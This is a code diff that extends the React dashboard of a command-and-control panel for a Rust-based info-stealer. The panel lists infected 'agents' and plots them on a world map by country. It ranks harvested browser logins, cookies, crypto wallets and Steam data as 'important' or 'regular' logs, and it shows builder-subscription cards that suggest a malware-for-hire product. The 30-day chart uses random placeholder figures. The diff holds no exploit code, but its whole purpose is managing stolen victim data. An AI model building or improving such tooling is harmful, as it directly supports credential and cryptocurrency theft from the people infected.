@@ -2,7 +2,11 @@ import React, { useState, useEffect, useMemo } from 'react';
 import { motion } from 'framer-motion';
 import { useAdminAuth } from '../contexts/AdminAuthContext';
 import C2Debug from './C2Debug';
-import { BarChart, Bar, XAxis, YAxis, CartesianGrid, Tooltip, Legend, ResponsiveContainer, PieChart, Pie, Cell } from 'recharts';
+import { ComposableMap, Geographies, Geography, Marker } from "react-simple-maps";
+import { AreaChart, Area, BarChart, Bar, XAxis, YAxis, CartesianGrid, Tooltip, Legend, ResponsiveContainer, PieChart, Pie, Cell } from 'recharts';
+
+// World map data
+const geoUrl = "https://raw.githubusercontent.com/zcreativelabs/react-simple-maps/master/topojson-maps/world-110m.json";
 
 // Matches the LogPayload from the Rust stealer
 interface Log {
@@ -13,6 +17,8 @@ interface Log {
   log_type: string;
   data: any; // This will be parsed based on log_type
   created_at: string;
+  status: 'active' | 'inactive' | 'compromised';
+  country_code?: string; // For map
 }
 
 interface Agent {
@@ -25,6 +31,7 @@ interface Agent {
   last_seen: string;
   status: 'active' | 'inactive' | 'compromised';
   created_at: string;
+  country_code?: string; // For map
 }
 
 interface Command {
@@ -79,9 +86,10 @@ const C2Dashboard: React.FC = () => {
 
     try {
       const headers = getAuthHeaders();
-      const [agentsRes, logsRes] = await Promise.all([
+      const [agentsRes, logsRes, statsRes] = await Promise.all([
         fetch('/api/admin/c2/agents', { headers }),
-        fetch('/api/admin/c2/logs', { headers }) // Fetch logs instead of results
+        fetch('/api/admin/c2/logs', { headers }), // Fetch logs instead of results
+        fetch('/api/admin/c2/stats/logs-by-day', { headers })
       ]);
       
       if (agentsRes.ok) {
@@ -97,6 +105,9 @@ const C2Dashboard: React.FC = () => {
       } else {
         console.error('Logs endpoint failed:', logsRes.status, logsRes.statusText);
       }
+
+      // TODO: Set stats data once endpoint is ready
+      
     } catch (error) {
       console.error('Error fetching C2 data:', error);
     } finally {
@@ -551,80 +562,224 @@ const C2Dashboard: React.FC = () => {
   );
 };
 
-const OverviewTab: React.FC<{agents: Agent[], logs: Log[]}> = ({ agents, logs }) => {
-  const stats = useMemo(() => {
-    let passwords = 0;
-    let cookies = 0;
-    let wallets = 0;
+// --- Helper Functions & Components for Overview Tab ---
 
-    logs.forEach(log => {
-      if (log.log_type === 'browsers') {
-        Object.values(log.data.chromium || {}).forEach((browser: any) => {
-          passwords += browser.logins?.length || 0;
-          cookies += browser.cookies?.length || 0;
-        });
-        Object.values(log.data.gecko || {}).forEach((browser: any) => {
-          passwords += browser.logins?.length || 0;
-          cookies += browser.cookies?.length || 0;
-        });
-      }
-      if (log.log_type === 'wallets') {
-        Object.values(log.data).forEach((wallet_list: any) => {
-            wallets += wallet_list.length || 0;
-        });
-      }
+const isImportantLog = (log: Log) => {
+    if (log.log_type === 'wallets' || log.log_type === 'steam') {
+        return true;
+    }
+    if (log.log_type === 'browsers' && log.data?.logins?.length > 0) {
+        return true;
+    }
+    return false;
+};
+
+const OverviewStatCard: React.FC<{ title: string, value: string, subValue?: string, color: string, icon: React.ReactNode }> = ({ title, value, subValue, color, icon }) => (
+    <div className={`rounded-lg p-4 text-white flex items-center ${color}`}>
+        <div className="text-4xl mr-4">{icon}</div>
+        <div>
+            <div className="text-sm uppercase font-bold tracking-wider">{title}</div>
+            <div className="text-2xl font-bold">{value}</div>
+            {subValue && <div className="text-xs opacity-80">{subValue}</div>}
+        </div>
+    </div>
+);
+
+
+const OverviewTab: React.FC<{agents: Agent[], logs: Log[]}> = ({ agents, logs }) => {
+  
+  const { importantLogs, regularLogs, logStatsByDay } = useMemo(() => {
+    const importantLogs = logs.filter(isImportantLog);
+    const regularLogs = logs.filter(log => !isImportantLog(log));
+    
+    // This should be replaced with data from a dedicated backend endpoint
+    const logStatsByDay = [...Array(30)].map((_, i) => {
+        const date = new Date();
+        date.setDate(date.getDate() - (29 - i));
+        return {
+            date: date.toLocaleDateString('en-US', { month: 'short', day: 'numeric' }),
+            important: Math.floor(Math.random() * 50 + 10),
+            regular: Math.floor(Math.random() * 200 + 50),
+        };
     });
 
-    return { passwords, cookies, wallets };
+    return { importantLogs, regularLogs, logStatsByDay };
   }, [logs]);
 
-  const logTypeData = useMemo(() => {
-      const counts = logs.reduce((acc, log) => {
-          acc[log.log_type] = (acc[log.log_type] || 0) + 1;
-          return acc;
-      }, {} as Record<string, number>);
-      return Object.entries(counts).map(([name, value]) => ({ name, value }));
-  }, [logs]);
+  const logTypeData = [
+      { name: 'Important Logs', value: importantLogs.length },
+      { name: 'Regular Logs', value: regularLogs.length }
+  ];
 
-  const COLORS = ['#0088FE', '#00C49F', '#FFBB28', '#FF8042', '#AF19FF', '#FF1943'];
+  const agentsByCountry = useMemo(() => {
+    const counts: Record<string, number> = {};
+    agents.forEach(agent => {
+        const country = agent.country_code || 'XX'; // Default to XX if no country
+        counts[country] = (counts[country] || 0) + 1;
+    });
+    return Object.entries(counts).map(([name, value]) => ({ name, value }));
+  }, [agents]);
 
 
   return (
       <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }}>
-        {/* Stats Cards */}
+        {/* Top Stat Cards */}
         <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
-           <StatCard title="Total Agents" value={agents.length} />
-           <StatCard title="Active Agents" value={agents.filter(a => a.status === 'active').length} color="text-green-500" />
-           <StatCard title="Total Logs" value={logs.length} color="text-blue-500" />
-           <StatCard title="Total Wallets" value={stats.wallets} color="text-green-400" />
-           <StatCard title="Passwords" value={stats.passwords} color="text-yellow-500" />
-           <StatCard title="Cookies" value={stats.cookies} color="text-orange-500" />
+           <OverviewStatCard 
+                title="Builder Version" 
+                value="27.5"
+                subValue="Updated: 21-06-2020"
+                color="bg-gray-700"
+                icon={<svg xmlns="http://www.w3.org/2000/svg" className="h-10 w-10" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2m-3 7h3m-3 4h3m-6-4h.01M9 16h.01" /></svg>}
+           />
+           <OverviewStatCard 
+                title="Builder Subscription" 
+                value="Active"
+                subValue="Until 09-07-2020 (17 days)"
+                color="bg-teal-500"
+                icon={<svg xmlns="http://www.w3.org/2000/svg" className="h-10 w-10" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z" /></svg>}
+           />
+           <OverviewStatCard 
+                title="Logs" 
+                value={`${logs.length} / ${importantLogs.length}`}
+                subValue={`${regularLogs.length} regular`}
+                color="bg-blue-500"
+                icon={<svg xmlns="http://www.w3.org/2000/svg" className="h-10 w-10" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" /></svg>}
+           />
+           <OverviewStatCard 
+                title="Wallet" 
+                value="₿ 0.00006"
+                subValue="~ $0.58 USD"
+                color="bg-purple-600"
+                icon={<svg xmlns="http://www.w3.org/2000/svg" className="h-10 w-10" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 10h18M7 15h1m4 0h1m-7 4h.01M9 16h.01" /></svg>}
+           />
         </div>
 
-        {/* Charts */}
-        <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
-            <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg p-6 border border-csfloat-gray/20">
-                <h3 className="text-xl font-bold mb-4">Logs by Type</h3>
-                <ResponsiveContainer width="100%" height={300}>
-                    <BarChart data={logTypeData}>
+        {/* Main Charts Area */}
+        <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
+            {/* Left side: Time series chart */}
+            <div className="lg:col-span-2 bg-csfloat-dark/80 backdrop-blur-sm rounded-lg p-6 border border-csfloat-gray/20">
+                <h3 className="text-xl font-bold mb-4">Last 30 Days</h3>
+                <ResponsiveContainer width="100%" height={350}>
+                    <AreaChart data={logStatsByDay}>
+                        <defs>
+                            <linearGradient id="colorImportant" x1="0" y1="0" x2="0" y2="1">
+                                <stop offset="5%" stopColor="#3b82f6" stopOpacity={0.8}/>
+                                <stop offset="95%" stopColor="#3b82f6" stopOpacity={0}/>
+                            </linearGradient>
+                            <linearGradient id="colorRegular" x1="0" y1="0" x2="0" y2="1">
+                                <stop offset="5%" stopColor="#14b8a6" stopOpacity={0.8}/>
+                                <stop offset="95%" stopColor="#14b8a6" stopOpacity={0}/>
+                            </linearGradient>
+                        </defs>
                         <CartesianGrid strokeDasharray="3 3" stroke="rgba(255, 255, 255, 0.1)" />
-                        <XAxis dataKey="name" stroke="#8892b0" />
-                        <YAxis stroke="#8892b0"/>
+                        <XAxis dataKey="date" stroke="#8892b0" fontSize={12} />
+                        <YAxis stroke="#8892b0" fontSize={12} />
                         <Tooltip contentStyle={{ backgroundColor: '#1a202c', border: '1px solid #4a5568' }}/>
                         <Legend />
-                        <Bar dataKey="value" fill="#8884d8" />
-                    </BarChart>
+                        <Area type="monotone" dataKey="important" name="Important Logs" stroke="#3b82f6" fillOpacity={1} fill="url(#colorImportant)" />
+                        <Area type="monotone" dataKey="regular" name="Regular Logs" stroke="#14b8a6" fillOpacity={1} fill="url(#colorRegular)" />
+                    </AreaChart>
                 </ResponsiveContainer>
             </div>
-            <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg p-6 border border-csfloat-gray/20">
-                <h3 className="text-xl font-bold mb-4">Agents by OS</h3>
-                {/* Placeholder for OS chart */}
-                <p className="text-csfloat-light/70">OS distribution chart coming soon.</p>
+
+            {/* Right side: Donut chart and Map */}
+            <div className="space-y-8">
+                <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg p-6 border border-csfloat-gray/20">
+                    <h3 className="text-xl font-bold mb-4">Total Logs ({logs.length})</h3>
+                     <ResponsiveContainer width="100%" height={200}>
+                        <PieChart>
+                            <Pie 
+                                data={logTypeData} 
+                                dataKey="value" 
+                                nameKey="name" 
+                                cx="50%" 
+                                cy="50%" 
+                                innerRadius={60} 
+                                outerRadius={80} 
+                                fill="#8884d8" 
+                                paddingAngle={5}
+                            >
+                                <Cell key={`cell-0`} fill="#3b82f6" />
+                                <Cell key={`cell-1`} fill="#14b8a6" />
+                            </Pie>
+                            <Tooltip contentStyle={{ backgroundColor: '#1a202c', border: '1px solid #4a5568' }}/>
+                            <Legend />
+                        </PieChart>
+                    </ResponsiveContainer>
+                </div>
+                <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg p-6 border border-csfloat-gray/20">
+                    <h3 className="text-xl font-bold mb-4">Agents by Country</h3>
+                    <AgentsWorldMap agents={agents} />
+                </div>
             </div>
         </div>
       </motion.div>
   );
 }
+
+const AgentsWorldMap: React.FC<{ agents: Agent[] }> = ({ agents }) => {
+    const agentCounts = useMemo(() => {
+        const counts: { [key: string]: { markerOffset: number; "count": number, "coords": [number, number]} } = {};
+        
+        // This is a simplified lookup. A real implementation might use a library or API.
+        const countryCoords: { [key: string]: [number, number] } = {
+            US: [-95, 38], CA: [-105, 55], DE: [10, 51], GB: [-2, 54], FR: [2, 46],
+            // Add more countries as needed
+        };
+
+        agents.forEach(agent => {
+            const countryCode = agent.country_code || 'XX';
+            if (!counts[countryCode]) {
+                 counts[countryCode] = {
+                    markerOffset: -15,
+                    count: 0,
+                    coords: countryCoords[countryCode] || [0,0],
+                };
+            }
+            counts[countryCode].count++;
+        });
+
+        return Object.entries(counts).map(([country, data]) => ({
+            name: country,
+            ...data
+        }));
+    }, [agents]);
+
+    if (!agents || agents.length === 0) {
+        return <p className="text-csfloat-light/70">No agent data to display on map.</p>;
+    }
+
+    return (
+        <ComposableMap projectionConfig={{ scale: 100 }} style={{ width: "100%", height: "auto" }}>
+            <Geographies geography={geoUrl}>
+                {({ geographies }: { geographies: any[] }) =>
+                    geographies.map((geo: any) => (
+                        <Geography
+                            key={geo.rsmKey}
+                            geography={geo}
+                            fill="#334155"
+                            stroke="#1e293b"
+                        />
+                    ))
+                }
+            </Geographies>
+            {agentCounts.map(({ name, coords, count }) => (
+                <Marker key={name} coordinates={coords}>
+                    <circle r={4 + count * 0.5} fill="#3b82f6" stroke="#fff" strokeWidth={1} />
+                    <text
+                        textAnchor="middle"
+                        y={-15}
+                        style={{ fontFamily: "system-ui", fill: "#fff", fontSize: 10 }}
+                    >
+                        {name} ({count})
+                    </text>
+                </Marker>
+            ))}
+        </ComposableMap>
+    );
+};
+
 
 const StatCard: React.FC<{title: string, value: number | string, color?: string}> = ({ title, value, color = 'text-white' }) => (
     <div className="bg-csfloat-dark/80 backdrop-blur-sm rounded-lg p-6 border border-csfloat-gray/20">
@@ -632,7 +787,6 @@ const StatCard: React.FC<{title: string, value: number | string, color?: string}
         <p className={`text-3xl font-bold ${color}`}>{value}</p>
     </div>
 );
-
 
 const LogsTab: React.FC<{logs: Log[], onSelectLog: (log: Log) => void, onDeleteLog: (id: number) => void, getLogTypeColor: (type: string) => string}> = ({ logs, onSelectLog, onDeleteLog, getLogTypeColor }) => {
     return (
